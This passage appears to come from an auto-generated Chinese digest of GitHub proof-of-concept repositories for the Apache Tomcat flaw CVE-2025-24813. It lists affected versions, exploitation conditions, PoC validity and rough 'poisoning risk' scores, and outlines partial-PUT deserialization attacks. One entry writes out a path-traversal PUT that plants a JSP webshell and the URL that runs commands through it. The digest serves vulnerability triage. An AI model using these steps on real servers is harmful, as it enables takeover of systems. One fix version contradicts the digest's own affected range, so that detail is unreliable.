CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
